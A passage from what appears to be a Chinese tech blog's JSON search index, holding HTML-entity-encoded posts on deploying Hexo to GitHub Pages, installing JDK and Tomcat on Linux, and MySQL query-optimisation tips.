Pages&#x7684;&#x4ED3;&#x5E93;&#xFF0C;&#x81F3;&#x5C11;&#x4E24;&#x4E2A;&#x5206;&#x652F;&#xFF0C;&#x4E00;&#x4E2A;hexo&#x5206;&#x652F;&#x7528;&#x6765;&#x5B58;&#x653E;&#x7F51;&#x7AD9;&#x7684;&#x539F;&#x59CB;&#x6587;&#x4EF6;&#xFF0C;&#x4E00;&#x4E2A;master&#x5206;&#x652F;&#x7528;&#x6765;&#x5B58;&#x653E;&#x751F;&#x6210;&#x7684;&#x9759;&#x6001;&#x7F51;&#x9875;&#x3002; &#x6B65;&#x9AA4;&#x5982;&#x4E0B;:1&#x3001;&#x521B;&#x5EFA;&#x4ED3;&#x5E93;&#xFF0C;Wasim37.github.io&#xFF1B;2&#x3001;&#x521B;&#x5EFA;&#x4E24;&#x4E2A;&#x5206;&#x652F;&#xFF1A;master &#x4E0E; hexo&#xFF1B;3&#x3001;&#x8BBE;&#x7F6E;hexo&#x4E3A;&#x9ED8;&#x8BA4;&#x5206;&#x652F;&#xFF08;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x624B;&#x52A8;&#x7BA1;&#x7406;&#x8FD9;&#x4E2A;&#x5206;&#x652F;&#x4E0A;&#x7684;Hexo&#x7F51;&#x7AD9;&#x6587;&#x4EF6;&#xFF09;&#xFF1B;4&#x3001;&#x4F7F;&#x7528;git clone git@github.com:Wasim37/Wasim37.github.io.git&#x62F7;&#x8D1D;&#x4ED3;&#x5E93;&#xFF1B;5&#x3001;&#x5728;&#x672C;&#x5730;Wasim37.github.io&#x6587;&#x4EF6;&#x5939;&#x4E0B;&#x901A;&#x8FC7;Git bash&#x4F9D;&#x6B21;&#x6267;&#x884C;npm install hexo&#x3001;hexo init&#x3001;npm install &#x548C; npm install hexo-deployer-git&#xFF08;&#x6B64;&#x65F6;&#x5F53;&#x524D;&#x5206;&#x652F;&#x5E94;&#x663E;&#x793A;&#x4E3A;hexo&#xFF09;;6&#x3001;&#x4FEE;&#x6539;_config.yml&#x4E2D;&#x7684;deploy&#x53C2;&#x6570;&#xFF0C;&#x5206;&#x652F;&#x5E94;&#x4E3A;master&#xFF1B;7&#x3001;&#x4F9D;&#x6B21;&#x6267;&#x884C;git add .&#x3001;git commit -m &#x201C;&#x2026;&#x201D;&#x3001;git push origin hexo&#x63D0;&#x4EA4;&#x7F51;&#x7AD9;&#x76F8;&#x5173;&#x7684;&#x6587;&#x4EF6;&#xFF1B;8&#x3001;&#x6267;&#x884C;hexo generate -d&#x751F;&#x6210;&#x7F51;&#x7AD9;&#x5E76;&#x90E8;&#x7F72;&#x5230;GitHub&#x4E0A;&#x3002; &#x672C;&#x5730;&#x4FEE;&#x6539;1&#x3001;&#x5728;&#x672C;&#x5730;&#x5BF9;&#x535A;&#x5BA2;&#x8FDB;&#x884C;&#x4FEE;&#x6539;&#xFF08;&#x6DFB;&#x52A0;&#x65B0;&#x535A;&#x6587;&#x3001;&#x4FEE;&#x6539;&#x6837;&#x5F0F;&#x7B49;&#x7B49;&#xFF09;&#x540E;&#xFF0C;&#x901A;&#x8FC7;&#x4E0B;&#x9762;&#x7684;&#x6D41;&#x7A0B;&#x8FDB;&#x884C;&#x7BA1;&#x7406;&#xFF1A;&#x4F9D;&#x6B21;&#x6267;&#x884C;git add .&#x3001;git commit -m &#x201C;&#x2026;&#x201D;&#x3001;git push origin hexo&#x6307;&#x4EE4;&#x5C06;&#x6539;&#x52A8;&#x63A8;&#x9001;&#x5230;GitHub&#xFF08;&#x6B64;&#x65F6;&#x5F53;&#x524D;&#x5206;&#x652F;&#x5E94;&#x4E3A;hexo&#xFF09;&#xFF1B;2&#x3001;&#x7136;&#x540E;&#x624D;&#x6267;&#x884C;hexo generate -d&#x53D1;&#x5E03;&#x7F51;&#x7AD9;&#x5230;master&#x5206;&#x652F;&#x4E0A;&#x3002; &#x672C;&#x5730;&#x8D44;&#x6599;&#x4E22;&#x5931;&#x6216;&#x8005;&#x60F3;&#x5728;&#x5176;&#x4ED6;&#x7535;&#x8111;&#x4E0A;&#x4FEE;&#x6539;&#x535A;&#x5BA2;1&#x3001;&#x4F7F;&#x7528;git clone git@github.com:Wasim37/Wasim37.github.io.git&#x62F7;&#x8D1D;&#x4ED3;&#x5E93;&#xFF08;&#x9ED8;&#x8BA4;&#x5206;&#x652F;&#x4E3A;hexo&#xFF09;&#xFF1B;2&#x3001;&#x5728;&#x672C;&#x5730;&#x65B0;&#x62F7;&#x8D1D;&#x7684;Wasim37.github.io&#x6587;&#x4EF6;&#x5939;&#x4E0B;&#x901A;&#x8FC7;Git bash&#x4F9D;&#x6B21;&#x6267;&#x884C;&#x4E0B;&#x5217;&#x6307;&#x4EE4;&#xFF1A;npm install hexo&#x3001;npm install&#x3001;npm install hexo-deployer-git&#xFF08;&#x8BB0;&#x5F97;&#xFF0C;&#x4E0D;&#x9700;&#x8981;hexo init&#x8FD9;&#x6761;&#x6307;&#x4EE4;&#xFF09;&#x3002; &#x5B89;&#x88C5;&#x9519;&#x8BEF;&#x8BB0;&#x5F55;&#x6267;&#x884C;hexo d&#x51FA;&#x73B0;&#x4EE5;&#x4E0B;&#x9519;&#x8BEF; &#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A;_config.yml &#x2014;&#x2014;&gt; deploy &#x2014;&#x2014;&gt; repositoryhttps://github.com/{username}/{username}.github.io.git &#x4FEE;&#x6539;&#x4E3A;git@github.com:{username}/{username}.github.io.git &#x6587;&#x7AE0;&#x7F16;&#x8F91;&#x5DE5;&#x5177;&#x6587;&#x7AE0;&#x7F16;&#x8F91;&#x5DE5;&#x5177;&#x4E00;&#x5F00;&#x59CB;&#x6211;&#x4F7F;&#x7528;&#x7684;&#x662F;subline&#xFF0C;&#x4F46;&#x56E0;&#x4E3A;&#x6CA1;&#x6709;&#x5FEB;&#x6377;&#x952E;&#x53CA;&#x9884;&#x89C8;&#x529F;&#x80FD;&#xFF0C;&#x540E;&#x6765;&#x9009;&#x62E9;&#x4E86;MarkdownPad&#x3002;&#x53EF;&#x6700;&#x8FD1;&#x53D1;&#x73B0;&#x65B0;&#x7248;&#x7684;&#x6709;&#x9053;&#x4E91;&#x7B14;&#x8BB0;&#x652F;&#x6301;Markdown&#x8BED;&#x6CD5;&#xFF0C;&#x679C;&#x65AD;&#x6362;&#x6210;&#x4E86;&#x6709;&#x9053;&#x3002;&#x56E0;&#x4E3A;&#x6709;&#x9053;&#x9664;&#x4E86;&#x7F16;&#x8F91;&#x529F;&#x80FD;&#xFF0C;&#x6211;&#x66F4;&#x770B;&#x91CD;&#x7684;&#x662F;&#x5B83;&#x5BF9;&#x6587;&#x7AE0;&#x7684;&#x4E8C;&#x6B21;&#x5907;&#x4EFD;. &#x6709;&#x9053;&#x4E91;&#x7B14;&#x8BB0;MarkDown&#x4F7F;&#x7528;&#x6559;&#x7A0B;&#xFF1A; http://note.youdao.com/iyoudao/?p=1895 &#x5176;&#x6B21;&#x6587;&#x7AE0;&#x56FE;&#x7247;&#x5982;&#x679C;&#x4E0D;&#x60F3;&#x6258;&#x7BA1;&#x5728;github&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4E03;&#x725B;&#x4E91;&#x5B58;&#x50A8;&#x7B49;&#x56FE;&#x5E8A;&#x5DE5;&#x5177;&#x3002; &#x6A21;&#x677F;&#x81EA;&#x5B9A;&#x4E49;&#x6211;&#x4F7F;&#x7528;&#x7684;&#x535A;&#x5BA2;&#x4E3B;&#x9898;&#x4E3A; icarus&#xFF0C;&#x5BF9;&#x6BD4;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;&#x6211;&#x5728;&#x5C55;&#x793A;&#x7EC6;&#x8282;&#x4E0A;&#x505A;&#x4E86;&#x4E00;&#x4E9B;&#x81EA;&#x5DF1;&#x7684;&#x4FEE;&#x6539;&#x3002; &#x6BD4;&#x5982;&#x9875;&#x9762;&#x5C55;&#x793A;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x5DE6;&#x4E2D;&#x53F3;&#x4E09;&#x4E2A;&#x533A;&#x57DF;&#xFF0C;&#x5206;&#x522B;&#x4E3A;profile-column&#xFF0C;main-column&#x548C;sidebar-column&#x3002;&#x6E90;&#x4EE3;&#x7801;&#x4E09;&#x8005;&#x5BBD;&#x5EA6;&#x6BD4;&#x4F8B;&#x4E3A;3:7:3&#x3002;&#x4E3A;&#x4E86;&#x7A81;&#x51FA;&#x6B63;&#x6587;&#xFF0C;&#x6211;&#x6539;&#x4E3A;&#x4E86; 2.3&#xFF1A;8.4&#xFF1A;2.3&#x3002;&#x6E90;&#x4EE3;&#x7801;&#x6587;&#x4EF6;&#x4F4D;&#x7F6E;&#x4E3A;&#xFF1A;icarus\\source\\css\\ _variables.styl &#x6587;&#x7AE0;&#x76EE;&#x5F55;icarus&#x4E3B;&#x9898;&#x6A21;&#x677F;&#x7684;&#x6587;&#x7AE0;&#x8BE6;&#x7EC6;&#x5C55;&#x793A;&#x9ED8;&#x8BA4;&#x662F;&#x4E0D;&#x5E26;&#x6709;&#x6587;&#x7AE0;&#x76EE;&#x5F55;&#x7684;&#x5982;&#x679C;&#x9700;&#x8981;&#x6DFB;&#x52A0;&#x6587;&#x7AE0;&#x76EE;&#x5F55;&#xFF0C;&#x53EF;&#x4EE5;&#x53C2;&#x8003;http://www.jianshu.com/p/72408c410904 icarus&#x4E3B;&#x9898;&#x6DFB;&#x52A0;&#x6587;&#x7AE0;&#x76EE;&#x5F55;&#xFF0C;&#x4FEE;&#x6539;themes\\icarus\\layout\\common\\article.ejs&#x6587;&#x4EF6;&#x5373;&#x53EF;&#x3002;123&lt;% if (!index &amp;&amp; post.toc) { %&gt;&#x4FEE;&#x6539;&#x4E3A;&lt;% if (!index &amp;&amp; post.toc != false) { %&gt; &#x6BCF;&#x7BC7;&#x6587;&#x7AE0;&#x53EF;&#x4EE5;&#x9009;&#x62E9;&#x662F;&#x5426;&#x5F00;&#x653E;&#x76EE;&#x5F55;&#x529F;&#x80FD;123456...title: Github+Hexo,&#x642D;&#x5EFA;&#x4E13;&#x5C5E;&#x7F51;&#x7AD9;categories: - demotoc: false...","raw":null,"content":null,"categories":[{"name":"其他技术","slug":"其他技术","permalink":"http://www.wangxin123.com/categories/其他技术/"}],"tags":[{"name":"github","slug":"github","permalink":"http://www.wangxin123.com/tags/github/"},{"name":"hexo","slug":"hexo","permalink":"http://www.wangxin123.com/tags/hexo/"}]},{"title":"linux中搭建java开发环境","slug":"linux中搭建java开发环境","date":"2016-05-29T14:10:00.000Z","updated":"2017-02-22T07:11:53.790Z","comments":true,"path":"2016/05/29/linux中搭建java开发环境/","link":"","permalink":"http://www.wangxin123.com/2016/05/29/linux中搭建java开发环境/","excerpt":"","keywords":null,"text":"JDK&#x5B89;&#x88C5;http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html&#x4E0B;&#x8F7D;&#x5BF9;&#x5E94;jdk&#x7248;&#x672C;&#xFF0C;&#x6BD4;&#x5982; jdk-7u80-linux-x64.tar.gz&#x3002; 1234567891011121314# &#x6267;&#x884C;&#x4E0B;&#x9762;&#x547D;&#x4EE4;&#x5B89;&#x88C5;JDKtar -xvf jdk-7u80-linux-x64.tar.gz -C /usr/localcd /usr/localmv jdk1.7.0_79/ jdk# &#x8BBE;&#x7F6E;&#x73AF;&#x5883;&#x53D8;&#x91CF;vim /etc/profile export JAVA_HOME=/opt/java/jdkexport PATH=$JAVA_HOME/bin:$PATHexport CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar# &#x4F7F;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x751F;&#x6548;source /etc/profile &#x6267;&#x884C;java -version&#x547D;&#x4EE4;&#xFF0C;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x662F;&#x5426;&#x5B89;&#x88C5;&#x6210;&#x529F;&#x3002;Tomcat&#x5B89;&#x88C5;12345678910# &#x89E3;&#x538B;mkdir -p /opt/tomcattar -xvf apache-tomcat-6.0.10.tar.gz -C /opt/tomcat/# &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x94FE;&#x63A5;ln -s /opt/tomcat/apache-tomcat-6.0.10 /opt/tomcat/tomcat6.0cd /opt/tomcat/tomcat6.0/bin./startup.sh &#x518D;&#x6253;&#x5F00;&#x6D4F;&#x89C8;&#x5668;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#xFF0C;&#x8F93;&#x5165;http:localhost:8080&#xFF0C;&#x732B;&#x7684;&#x9875;&#x9762;&#x51FA;&#x6765;&#xFF0C;&#x8BF4;&#x660E;&#x5B89;&#x88C5;&#x6210;&#x529F;&#x4E86;&#x3002; &#x81EA;&#x52A8;&#x5316;&#x90E8;&#x7F72;&#x811A;&#x672C;JDK&#xFF1A;https://github.com/Wasim37/deployment-scripts/tree/master/javaTomcat&#xFF1A;https://github.com/Wasim37/deployment-scripts/tree/master/tomcat","raw":null,"content":null,"categories":[{"name":"运维部署","slug":"运维部署","permalink":"http://www.wangxin123.com/categories/运维部署/"}],"tags":[{"name":"jdk","slug":"jdk","permalink":"http://www.wangxin123.com/tags/jdk/"}]},{"title":"MySQL优化总结，百万级数据库优化方案","slug":"MySQL优化总结，百万级数据库优化方案","date":"2016-05-27T14:02:00.000Z","updated":"2017-02-21T08:37:21.581Z","comments":true,"path":"2016/05/27/MySQL优化总结，百万级数据库优化方案/","link":"","permalink":"http://www.wangxin123.com/2016/05/27/MySQL优化总结，百万级数据库优化方案/","excerpt":"1&#x3001;&#x5BF9;&#x67E5;&#x8BE2;&#x8FDB;&#x884C;&#x4F18;&#x5316;&#xFF0C;&#x5E94;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x5168;&#x8868;&#x626B;&#x63CF;&#xFF0C;&#x9996;&#x5148;&#x5E94;&#x8003;&#x8651;&#x5728; where &#x53CA; order by &#x6D89;&#x53CA;&#x7684;&#x5217;&#x4E0A;&#x5EFA;&#x7ACB;&#x7D22;&#x5F15;&#x3002; 2&#x3001;&#x5E94;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x5728; where &#x5B50;&#x53E5;&#x4E2D;&#x5BF9;&#x5B57;&#x6BB5;&#x8FDB;&#x884C; null &#x503C;&#x5224;&#x65AD;&#xFF0C;&#x5426;&#x5219;&#x5C06;&#x5BFC;&#x81F4;&#x5F15;&#x64CE;&#x653E;&#x5F03;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x800C;&#x8FDB;&#x884C;&#x5168;&#x8868;&#x626B;&#x63CF;&#xFF0C;1Sql &#x4EE3;&#x7801; : select id from t where num is null; &#x53EF;&#x4EE5;&#x5728; num &#x4E0A;&#x8BBE;&#x7F6E;&#x9ED8;&#x8BA4;&#x503C; 0,&#x786E;&#x4FDD;&#x8868;&#x4E2D; num &#x5217;&#x6CA1;&#x6709; null &#x503C;&#xFF0C;&#x7136;&#x540E;&#x8FD9;&#x6837;&#x67E5;&#x8BE2;&#xFF1A;1Sql &#x4EE3;&#x7801; : select id from t where num=0; 3&#x3001;&#x5E94;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x5728; where &#x5B50;&#x53E5;&#x4E2D;&#x4F7F;&#x7528;!=&#x6216;&lt;&gt;&#x64CD;&#x4F5C;&#x7B26;&#xFF0C;&#x5426;&#x5219;&#x5C06;&#x5F15;&#x64CE;&#x653E;&#x5F03;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x800C;&#x8FDB;&#x884C;&#x5168;&#x8868;&#x626B;&#x63CF;&#x3002; 4&#x3001;&#x5E94;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x5728; where &#x5B50;&#x53E5;&#x4E2D;&#x4F7F;&#x7528; or &#x6765;&#x8FDE;&#x63A5;&#x6761;&#x4EF6;&#xFF0C;&#x5426;&#x5219;&#x5C06;&#x5BFC;&#x81F4;&#x5F15;&#x64CE;&#x653E;&#x5F03;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x800C;&#x8FDB;&#x884C;&#x5168;&#x8868;&#x626B;&#x63CF;&#xFF0C;1Sql &#x4EE3;&#x7801; : select id from t where num=10 or num=20; &#x53EF;&#x4EE5;&#x8FD9;&#x6837;&#x67E5;&#x8BE2;&#xFF1A;1Sql &#x4EE3;&#x7801; : select id from t where num=10 union all select id from t where num=20;","keywords":null,"text":"1&#x3001;&#x5BF9;&#x67E5;&#x8BE2;&#x8FDB;&#x884C;&#x4F18;&#x5316;&#xFF0C;&#x5E94;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x5168;&#x8868;&#x626B;&#x63CF;&#xFF0C;&#x9996;&#x5148;&#x5E94;&#x8003;&#x8651;&#x5728; where &#x53CA; order by &#x6D89;&#x53CA;&#x7684;&#x5217;&#x4E0A;&#x5EFA;&#x7ACB;&#x7D22;&#x5F15;&#x3002; 2&#x3001;&#x5E94;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x5728; where &#x5B50;&#x53E5;&#x4E2D;&#x5BF9;&#x5B57;&#x6BB5;&#x8FDB;&#x884C; null &#x503C;&#x5224;&#x65AD;&#xFF0C;&#x5426;&#x5219;&#x5C06;&#x5BFC;&#x81F4;&#x5F15;&#x64CE;&#x653E;&#x5F03;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x800C;&#x8FDB;&#x884C;&#x5168;&#x8868;&#x626B;&#x63CF;&#xFF0C;1Sql &#x4EE3;&#x7801; : select id from t where num is null; &#x53EF;&#x4EE5;&#x5728; num &#x4E0A;&#x8BBE;&#x7F6E;&#x9ED8;&#x8BA4;&#x503C; 0,&#x786E;&#x4FDD;&#x8868;&#x4E2D; num &#x5217;&#x6CA1;&#x6709; null &#x503C;&#xFF0C;&#x7136;&#x540E;&#x8FD9;&#x6837;&#x67E5;&#x8BE2;&#xFF1A;1Sql &#x4EE3;&#x7801; : select id from t where num=0; 3&#x3001;&#x5E94;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x5728; where &#x5B50;&#x53E5;&#x4E2D;&#x4F7F;&#x7528;!=&#x6216;&lt;&gt;&#x64CD;&#x4F5C;&#x7B26;&#xFF0C;&#x5426;&#x5219;&#x5C06;&#x5F15;&#x64CE;&#x653E;&#x5F03;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x800C;&#x8FDB;&#x884C;&#x5168;&#x8868;&#x626B;&#x63CF;&#x3002; 4&#x3001;&#x5E94;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x5728; where &#x5B50;&#x53E5;&#x4E2D;&#x4F7F;&#x7528; or &#x6765;&#x8FDE;&#x63A5;&#x6761;&#x4EF6;&#xFF0C;&#x5426;&#x5219;&#x5C06;&#x5BFC;&#x81F4;&#x5F15;&#x64CE;&#x653E;&#x5F03;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x800C;&#x8FDB;&#x884C;&#x5168;&#x8868;&#x626B;&#x63CF;&#xFF0C;1Sql &#x4EE3;&#x7801; : select id from t where num=10 or num=20; &#x53EF;&#x4EE5;&#x8FD9;&#x6837;&#x67E5;&#x8BE2;&#xFF1A;1Sql &#x4EE3;&#x7801; : select id from t where num=10 union all select id from t where num=20; 5&#x3001;in &#x548C; not in &#x4E5F;&#x8981;&#x614E;&#x7528;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x5BFC;&#x81F4;&#x5168;&#x8868;&#x626B;&#x63CF;&#xFF0C;&#x5982;&#xFF1A;1Sql &#x4EE3;&#x7801; : select id from t where num in(1,2,3); &#x5BF9;&#x4E8E;&#x8FDE;&#x7EED;&#x7684;&#x6570;&#x503C;&#xFF0C;&#x80FD;&#x7528; between &#x5C31;&#x4E0D;&#x8981;&#x7528; in &#x4E86;&#xFF1A;1Sql &#x4EE3;&#x7801; : select id from t where num between 1 and 3; 6&#x3001;&#x4E0B;&#x9762;&#x7684;&#x67E5;&#x8BE2;&#x4E5F;&#x5C06;&#x5BFC;&#x81F4;&#x5168;&#x8868;&#x626B;&#x63CF;&#xFF1A;1Sql &#x4EE3;&#x7801; : select id from t where name like &apos;%c%&apos;; &#x82E5;&#x8981;&#x63D0;&#x9AD8;&#x6548;&#x7387;&#xFF0C;&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x5168;&#x6587;&#x68C0;&#x7D22;&#x3002; 7&#x3001;&#x5982;&#x679C;&#x5728; where &#x5B50;&#x53E5;&#x4E2D;&#x4F7F;&#x7528;&#x53C2;&#x6570;&#xFF0C;&#x4E5F;&#x4F1A;&#x5BFC;&#x81F4;&#x5168;&#x8868;&#x626B;&#x63CF;&#x3002;&#x56E0;&#x4E3A; SQL &#x53EA;&#x6709;&#x5728;&#x8FD0;&#x884C;&#x65F6;&#x624D;&#x4F1A;&#x89E3;&#x6790;&#x5C40;&#x90E8;&#x53D8;&#x91CF;&#xFF0C;&#x4F46;&#x4F18; &#x5316;&#x7A0B;&#x5E8F;&#x4E0D;&#x80FD;&#x5C06;&#x8BBF;&#x95EE;&#x8BA1;&#x5212;&#x7684;&#x9009;&#x62E9;&#x63A8;&#x8FDF;&#x5230;&#x8FD0;&#x884C;&#x65F6;;&#x5B83;&#x5FC5;&#x987B;&#x5728;&#x7F16;&#x8BD1;&#x65F6;&#x8FDB;&#x884C;&#x9009;&#x62E9;&#x3002;&#x7136; &#x800C;&#xFF0C;&#x5982;&#x679C;&#x5728;&#x7F16;&#x8BD1;&#x65F6;&#x5EFA;&#x7ACB;&#x8BBF;&#x95EE;&#x8BA1; &#x5212;&#xFF0C;&#x53D8;&#x91CF;&#x7684;&#x503C;&#x8FD8;&#x662F;&#x672A;&#x77E5;&#x7684;&#xFF0C;&#x56E0;&#x800C;&#x65E0;&#x6CD5;&#x4F5C;&#x4E3A;&#x7D22;&#x5F15;&#x9009;&#x62E9;&#x7684;&#x8F93;&#x5165;&#x9879;&#x3002;&#x5982;&#x4E0B;&#x9762;&#x8BED;&#x53E5;&#x5C06;&#x8FDB;&#x884C;&#x5168;&#x8868;&#x626B;&#x63CF;&#xFF1A;1Sql &#x4EE3;&#x7801; : select id from t where num=@num ; &#x53EF;&#x4EE5;&#x6539;&#x4E3A;&#x5F3A;&#x5236;&#x67E5;&#x8BE2;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#xFF1A;1Sql &#x4EE3;&#x7801; : select id from t with(index(&#x7D22;&#x5F15;&#x540D;)) where num=@num ; 8&#x3001;&#x5E94;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x5728; where &#x5B50;&#x53E5;&#x4E2D;&#x5BF9;&#x5B57;&#x6BB5;&#x8FDB;&#x884C;&#x8868;&#x8FBE;&#x5F0F;&#x64CD;&#x4F5C;&#xFF0C; &#x8FD9;&#x5C06;&#x5BFC;&#x81F4;&#x5F15;&#x64CE;&#x653E;&#x5F03;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x800C;&#x8FDB;&#x884C;&#x5168;&#x8868;&#x626B;&#x63CF;&#x3002;1Sql &#x4EE3;&#x7801; : select id from t where num/2=100; &#x53EF;&#x4EE5;&#x8FD9;&#x6837;&#x67E5;&#x8BE2;&#xFF1A;1Sql &#x4EE3;&#x7801; : select id from t where num=100*2; 9&#x3001;&#x5E94;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x5728; where &#x5B50;&#x53E5;&#x4E2D;&#x5BF9;&#x5B57;&#x6BB5;&#x8FDB;&#x884C;&#x51FD;&#x6570;&#x64CD;&#x4F5C;&#xFF0C;&#x8FD9;&#x5C06;&#x5BFC;&#x81F4;&#x5F15;&#x64CE;&#x653E;&#x5F03;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x800C;&#x8FDB;&#x884C;&#x5168;&#x8868;&#x626B;&#x63CF;&#x3002;&#x5982;&#xFF1A;1Sql &#x4EE3;&#x7801; : select id from t where substring(name,1,3)=&apos;abc&apos;;#name &#x4EE5; abc &#x5F00;&#x5934;&#x7684; id &#x5E94;&#x6539;&#x4E3A;&#xFF1A;1Sql &#x4EE3;&#x7801; : select id from t where name like &apos;abc%&apos;; 10&#x3001;&#x4E0D;&#x8981;&#x5728; where &#x5B50;&#x53E5;&#x4E2D;&#x7684;&#x201C;=&#x201D;&#x5DE6;&#x8FB9;&#x8FDB;&#x884C;&#x51FD;&#x6570;&#x3001;&#x7B97;&#x672F;&#x8FD0;&#x7B97;&#x6216;&#x5176;&#x4ED6;&#x8868;&#x8FBE;&#x5F0F;&#x8FD0;&#x7B97;&#xFF0C;&#x5426;&#x5219;&#x7CFB;&#x7EDF;&#x5C06;&#x53EF;&#x80FD;&#x65E0;&#x6CD5;&#x6B63;&#x786E;&#x4F7F;&#x7528; &#x7D22;&#x5F15;&#x3002; 11&#x3001;&#x5728;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x5B57;&#x6BB5;&#x4F5C;&#x4E3A;&#x6761;&#x4EF6;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x8BE5;&#x7D22;&#x5F15;&#x662F;&#x590D;&#x5408;&#x7D22;&#x5F15;&#xFF0C;&#x90A3;&#x4E48;&#x5FC5;&#x987B;&#x4F7F;&#x7528;&#x5230;&#x8BE5;&#x7D22;&#x5F15;&#x4E2D;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;&#x4F5C;&#x4E3A;&#x6761;&#x4EF6; &#x65F6;&#x624D;&#x80FD;&#x4FDD;&#x8BC1;&#x7CFB;&#x7EDF;&#x4F7F;&#x7528;&#x8BE5;&#x7D22;&#x5F15;&#xFF0C; &#x5426;&#x5219;&#x8BE5;&#x7D22;&#x5F15;&#x5C06;&#x4E0D;&#x4F1A; &#x88AB;&#x4F7F;&#x7528;&#xFF0C; &#x5E76;&#x4E14;&#x5E94;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x8BA9;&#x5B57;&#x6BB5;&#x987A;&#x5E8F;&#x4E0E;&#x7D22;&#x5F15;&#x987A;&#x5E8F;&#x76F8;&#x4E00;&#x81F4;&#x3002; 12&#x3001;&#x4E0D;&#x8981;&#x5199;&#x4E00;&#x4E9B;&#x6CA1;&#x6709;&#x610F;&#x4E49;&#x7684;&#x67E5;&#x8BE2;&#xFF0C;&#x5982;&#x9700;&#x8981;&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x7A7A;&#x8868;&#x7ED3;&#x6784;&#xFF1A;1Sql &#x4EE3;&#x7801; : select col1,col2 into #t from t where 1=0; &#x8FD9;&#x7C7B;&#x4EE3;&#x7801;&#x4E0D;&#x4F1A;&#x8FD4;&#x56DE;&#x4EFB;&#x4F55;&#x7ED3;&#x679C;&#x96C6;&#xFF0C;&#x4F46;&#x662F;&#x4F1A;&#x6D88;&#x8017;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;&#x7684;&#xFF0C;&#x5E94;&#x6539;&#x6210;&#x8FD9;&#x6837;&#xFF1A;1Sql &#x4EE3;&#x7801; : create table #t(&#x2026;); 13&#x3001;&#x5F88;&#x591A;&#x65F6;&#x5019;&#x7528; exists &#x4EE3;&#x66FF; in &#x662F;&#x4E00;&#x4E2A;&#x597D;&#x7684;&#x9009;&#x62E9;&#xFF1A;1Sql &#x4EE3;&#x7801; : select num from a where num in(select num from b); &#x7528;&#x4E0B;&#x9762;&#x7684;&#x8BED;&#x53E5;&#x66FF;&#x6362;&#xFF1A;1Sql &#x4EE3;&#x7801; : select num from a where exists(select 1 from b where num=a&#x3001;num); 14&#x3001;&#x5E76;&#x4E0D;&#x662F;&#x6240;&#x6709;&#x7D22;&#x5F15;&#x5BF9;&#x67E5;&#x8BE2;&#x90FD;&#x6709;&#x6548;&#xFF0C;SQL &#x662F;&#x6839;&#x636E;&#x8868;&#x4E2D;&#x6570;&#x636E;&#x6765;&#x8FDB;&#x884C;&#x67E5;&#x8BE2;&#x4F18;&#x5316;&#x7684;&#xFF0C;&#x5F53;&#x7D22;&#x5F15;&#x5217;&#x6709;&#x5927;&#x91CF;&#x6570;&#x636E;&#x91CD;&#x590D;&#x65F6;&#xFF0C; SQL &#x67E5;&#x8BE2;&#x53EF;&#x80FD;&#x4E0D;&#x4F1A;&#x53BB;&#x5229;&#x7528;&#x7D22;&#x5F15;&#xFF0C;&#x5982;&#x4E00;&#x8868;&#x4E2D;&#x6709;&#x5B57;&#x6BB5; ,male&#x3001;female &#x51E0;&#x4E4E;&#x5404;&#x4E00;&#x534A;&#xFF0C;&#x90A3;&#x4E48;&#x5373;&#x4F7F;&#x5728; &#x4E0A;&#x5EFA; &#x4E86;&#x7D22;&#x5F15;&#x4E5F;&#x5BF9;&#x67E5;&#x8BE2;&#x6548;&#x7387;&#x8D77;&#x4E0D;&#x4E86;&#x4F5C;&#x7528;&#x3002; 15&#x3001;&#x7D22;&#x5F15;&#x5E76;&#x4E0D;&#x662F;&#x8D8A;&#x591A;&#x8D8A;&#x597D;&#xFF0C;&#x7D22;&#x5F15;&#x56FA;&#x7136;&#x53EF;&#x4EE5;&#x63D0;&#x9AD8;&#x76F8;&#x5E94;&#x7684; select &#x7684;&#x6548;&#x7387;&#xFF0C;&#x4F46;&#x540C;&#x65F6;&#x4E5F;&#x964D;&#x4F4E;&#x4E86; insert &#x53CA; update &#x7684;&#x6548;&#x7387;&#xFF0C;&#x56E0;&#x4E3A; insert &#x6216; update 